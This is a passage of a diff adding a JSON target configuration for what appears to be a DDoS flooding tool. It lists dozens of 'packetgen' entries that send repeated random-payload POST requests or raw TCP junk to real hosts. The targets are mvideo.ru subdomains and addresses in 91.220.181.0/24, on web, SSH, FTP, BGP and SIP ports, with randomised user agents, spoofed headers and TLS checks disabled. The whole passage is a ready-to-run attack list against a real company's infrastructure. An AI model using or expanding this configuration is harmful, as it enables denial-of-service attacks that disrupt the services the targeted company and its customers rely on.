+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.243",
+                                "Referer": "https://91.220.181.243",
+                                "X-Forwarded-Host": "91.220.181.243",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.3",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.3:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.3",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.3",
+                                "Referer": "http://91.220.181.3",
+                                "X-Forwarded-Host": "91.220.181.3",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.31",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.31:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.31",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.31",
+                                "Referer": "https://91.220.181.31",
+                                "X-Forwarded-Host": "91.220.181.31",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.240:5060",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.240:5060"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.37:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.37:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.227:2001",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.227:2001"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://tm.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "tm.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://tm.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://tm.mvideo.ru",
+                                "Referer": "https://tm.mvideo.ru",
+                                "X-Forwarded-Host": "tm.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.206:179",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.206:179"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://tfs3.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "tfs3.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://tfs3.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://tfs3.mvideo.ru",
+                                "Referer": "https://tfs3.mvideo.ru",
+                                "X-Forwarded-Host": "tfs3.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://tmg01.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "tmg01.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://tmg01.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://tmg01.mvideo.ru",
+                                "Referer": "https://tmg01.mvideo.ru",
+                                "X-Forwarded-Host": "tmg01.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://mvpn.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "mvpn.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://mvpn.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://mvpn.mvideo.ru",
+                                "Referer": "https://mvpn.mvideo.ru",
+                                "X-Forwarded-Host": "mvpn.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://tm-qas.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "tm-qas.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://tm-qas.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://tm-qas.mvideo.ru",
+                                "Referer": "https://tm-qas.mvideo.ru",
+                                "X-Forwarded-Host": "tm-qas.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.88:10000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.88:10000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.87",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.87:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.87",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.87",
+                                "Referer": "https://91.220.181.87",
+                                "X-Forwarded-Host": "91.220.181.87",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://cdn-plt.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "cdn-plt.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://cdn-plt.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://cdn-plt.mvideo.ru",
+                                "Referer": "https://cdn-plt.mvideo.ru",
+                                "X-Forwarded-Host": "cdn-plt.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://amp.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "amp.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://amp.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://amp.mvideo.ru",
+                                "Referer": "https://amp.mvideo.ru",
+                                "X-Forwarded-Host": "amp.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://api-gw.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "api-gw.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://api-gw.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://api-gw.mvideo.ru",
+                                "Referer": "http://api-gw.mvideo.ru",
+                                "X-Forwarded-Host": "api-gw.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.219",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.219:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.219",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.219",
+                                "Referer": "https://91.220.181.219",
+                                "X-Forwarded-Host": "91.220.181.219",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://mvpn.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "mvpn.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://mvpn.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://mvpn.mvideo.ru",
+                                "Referer": "http://mvpn.mvideo.ru",
+                                "X-Forwarded-Host": "mvpn.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.25",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.25:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.25",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.25",
+                                "Referer": "https://91.220.181.25",
+                                "X-Forwarded-Host": "91.220.181.25",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://api-gw.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "api-gw.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://api-gw.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://api-gw.mvideo.ru",
+                                "Referer": "https://api-gw.mvideo.ru",
+                                "X-Forwarded-Host": "api-gw.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.25",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.25:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.25",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.25",
+                                "Referer": "http://91.220.181.25",
+                                "X-Forwarded-Host": "91.220.181.25",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://delivery.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "delivery.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://delivery.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://delivery.mvideo.ru",
+                                "Referer": "https://delivery.mvideo.ru",
+                                "X-Forwarded-Host": "delivery.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.232",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.232:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.232",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.232",
+                                "Referer": "http://91.220.181.232",
+                                "X-Forwarded-Host": "91.220.181.232",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://delivery-qas.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "delivery-qas.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://delivery-qas.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://delivery-qas.mvideo.ru",
+                                "Referer": "http://delivery-qas.mvideo.ru",
+                                "X-Forwarded-Host": "delivery-qas.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.47:444",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.47:444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://fs02.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "fs02.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://fs02.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://fs02.mvideo.ru",
+                                "Referer": "https://fs02.mvideo.ru",
+                                "X-Forwarded-Host": "fs02.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.37:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.37:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.43:8443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.43:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.247",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.247:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.247",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.247",
+                                "Referer": "http://91.220.181.247",
+                                "X-Forwarded-Host": "91.220.181.247",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.237",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.237:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.237",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
